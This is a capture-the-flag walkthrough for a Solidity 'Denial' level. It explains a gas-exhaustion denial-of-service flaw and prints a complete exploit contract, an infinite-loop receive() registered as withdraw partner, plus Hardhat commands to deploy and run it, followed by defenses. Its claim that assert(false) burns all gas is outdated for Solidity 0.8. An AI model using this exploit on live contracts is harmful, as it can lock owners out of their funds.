# Level 20: Denial Challenge

## Challenge Description

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

## Contract Location

The challenge contract is located at:
```
/contracts/level-20-denial/Denial.sol
```

## Understanding the Challenge

The `Denial` contract is a simple wallet that allows the owner to withdraw funds along with a designated partner:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### Key Observations

1. The contract has an `owner` address that's hardcoded
2. Anyone can set themselves as a `partner` using `setWithdrawPartner()`
3. The `withdraw()` function sends 1% of the balance to the partner and 1% to the owner
4. The partner receives funds via `.call{value}("")` which forwards all available gas
5. The owner receives funds via `.transfer()` which only forwards 2300 gas
6. The comment says "The recipient can revert, the owner will still get their share" - but is this true?

Our goal is to prevent the owner from withdrawing funds when they call `withdraw()`.

## Winning Strategy

The key to solving this challenge involves understanding how gas forwarding works with different Ethereum call methods and exploiting the fact that `.call()` forwards all available gas.

### The Vulnerability

The vulnerability lies in the `withdraw()` function's use of `.call()` to send funds to the partner:

```solidity
partner.call{value: amountToSend}("");
payable(owner).transfer(amountToSend);
```

**Key Points:**
1. `.call{value}("")` forwards **ALL available gas** to the partner contract
2. If the partner is a malicious contract, it can consume all the gas
3. When the partner consumes all gas, there's no gas left for the `owner.transfer()` to execute
4. The entire transaction will fail due to "out of gas"

### Gas Forwarding in Ethereum

Different methods of sending ETH forward different amounts of gas:

| Method | Gas Forwarded | Behavior |
|--------|---------------|----------|
| `.transfer()` | 2300 gas (fixed) | Reverts on failure |
| `.send()` | 2300 gas (fixed) | Returns false on failure |
| `.call{value}()` | All remaining gas (or specified amount) | Returns success boolean |

The 2300 gas limit for `.transfer()` and `.send()` is intentionally low to prevent reentrancy attacks but allows enough for a simple fallback/receive function.

## Hint for Thinking

Ask yourself:
* What happens when `.call()` forwards all available gas to a contract?
* Can a contract consume all the gas it receives?
* What happens to subsequent operations when all gas is consumed?
* How can you create a contract that consumes all gas?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### The Attack Vector

Our attack strategy is to create a malicious withdraw partner that consumes all available gas, preventing the owner's transfer from executing:

1. Deploy a malicious contract with a gas-consuming `receive()` function
2. Set our malicious contract as the withdraw partner
3. When `withdraw()` is called, our contract consumes all gas
4. The subsequent `owner.transfer()` fails due to out of gas
5. The owner is denied from withdrawing funds!

### Methods to Consume All Gas

There are several ways to consume all available gas in a contract:

#### Method 1: Infinite Loop
```solidity
receive() external payable {
    while(true) {}
}
```

#### Method 2: Assert False
```solidity
receive() external payable {
    assert(false); // Consumes all gas and reverts
}
```

#### Method 3: Expensive Storage Operations
```solidity
receive() external payable {
    while(gasleft() > 0) {
        someStorage[counter++] = bytes32(block.timestamp);
    }
}
```

### Implementation Details

The solution contract, `DenialExploit`, implements the gas exhaustion attack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint256);
}

contract DenialExploit {
    address public denial;
    address public owner;

    constructor(address _denial) {
        denial = _denial;
        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        IDenial(denial).setWithdrawPartner(address(this));
    }

    receive() external payable {
        // Infinite loop - consumes all gas
        while(true) {}
    }

    function checkBalance() external view returns (uint256) {
        return IDenial(denial).contractBalance();
    }
}
```

### How It Works

1. **Setup Phase**: 
   - Deploy `DenialExploit` with the target `Denial` contract address
   - Call `exploit()` to register as the withdraw partner

2. **Attack Phase**:
   - When anyone calls `Denial.withdraw()`:
     - The contract calculates 1% of balance to send
     - It calls `partner.call{value: amountToSend}("")`
     - Our malicious `receive()` function gets called with all remaining gas
     - The infinite loop `while(true) {}` consumes all gas
     - The transaction runs out of gas before reaching `owner.transfer()`
     - The owner is denied from receiving funds!

3. **Result**:
   - The `withdraw()` function cannot complete successfully
   - The owner cannot withdraw their share of funds
   - This is a Denial of Service (DoS) attack

### Why This Works

The critical issue is the order of operations and gas forwarding:

```solidity
partner.call{value: amountToSend}("");  // Forwards ALL gas
payable(owner).transfer(amountToSend);  // Never gets executed
```

Since `.call()` forwards all available gas to the partner, and our partner consumes all that gas, there's nothing left for the subsequent operations. The transaction fails with "out of gas" error.

### Execution Steps

1. **Deploy the Denial Contract**:
   ```shell
   npx hardhat deploy --tags denial --network sepolia
   ```

2. **Deploy the DenialExploit Contract**:
   ```shell
   TARGET_ADDRESS=0xYourDenialAddress npx hardhat deploy --tags denial-solution --network sepolia
   ```

3. **Execute the Exploit**:
   ```shell
   DENIAL_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourDenialAddress npx hardhat run scripts/level-20-denial/execute-denial-exploit.ts --network sepolia
   ```

4. **Verify the Attack**:
   - Try calling `withdraw()` on the Denial contract
   - The transaction should fail with "out of gas" error
   - The owner cannot receive their funds

## Key Insights

1. **Gas Forwarding Dangers**: Using `.call()` to send ETH forwards all available gas by default, which can be dangerous if the recipient is untrusted. The recipient can consume all gas and prevent subsequent operations.

2. **Denial of Service (DoS)**: This is a classic DoS attack where a malicious actor prevents legitimate users (the owner) from using the contract's functionality.

3. **External Call Risks**: Making external calls to untrusted contracts is risky. The called contract can:
   - Consume all gas
   - Reenter your contract
   - Revert and cause your transaction to fail
   - Take longer than expected to execute

4. **Gas Stipend**: Methods like `.transfer()` and `.send()` send a fixed 2300 gas stipend, which is enough for a simple receive function but prevents complex operations and reentrancy. However, relying on this gas stipend is not recommended in modern Solidity.

5. **Incorrect Assumption**: The comment in the code says "The recipient can revert, the owner will still get their share" - this is **FALSE**. If the recipient consumes all gas, the owner won't get their share because the transaction runs out of gas.

## Defense Mechanisms

To protect against this type of attack:

1. **Pull Over Push Pattern**: Instead of pushing funds to addresses, let them pull (withdraw) funds themselves:
   ```solidity
   mapping(address => uint256) public balances;
   
   function withdraw() public {
       uint256 amount = balances[msg.sender];
       balances[msg.sender] = 0;
       payable(msg.sender).transfer(amount);
   }
   ```

2. **Gas Limits on External Calls**: Limit the gas forwarded to external calls:
   ```solidity
   partner.call{value: amountToSend, gas: 10000}("");
   ```

3. **Separate Transactions**: Have separate functions for partner and owner withdrawals:
   ```solidity
   function withdrawPartner() public {
       // Partner withdrawal logic
   }
   
   function withdrawOwner() public {
       // Owner withdrawal logic
   }
   ```

4. **Checks-Effects-Interactions Pattern**: Complete all state changes before making external calls:
   ```solidity
   function withdraw() public {
       uint256 amountToSend = address(this).balance / 100;
       timeLastWithdrawn = block.timestamp;
       withdrawPartnerBalances[partner] += amountToSend;
       
       // External calls last
       payable(owner).transfer(amountToSend);
       partner.call{value: amountToSend}("");
   }
   ```

5. **Reentrancy Guards**: Use OpenZeppelin's `ReentrancyGuard` or similar protection.

## Real-World Implications

This vulnerability pattern has appeared in several real-world exploits:

1. **GovernMental Ponzi Scheme (2016)**: The contract couldn't pay out winners because the gas costs of looping through winners exceeded the block gas limit.

2. **King of the Ether (2016)**: Players could become "unchallenged king" by making it too expensive (in gas) to claim the throne from them.

3. **Byzantine Fault Tolerance Issues**: In systems where consensus depends on all parties being able to execute, a single malicious actor consuming all gas can halt the entire system.

The key lesson: **Never trust external contracts with all your gas**, and always assume external calls can fail or behave maliciously.
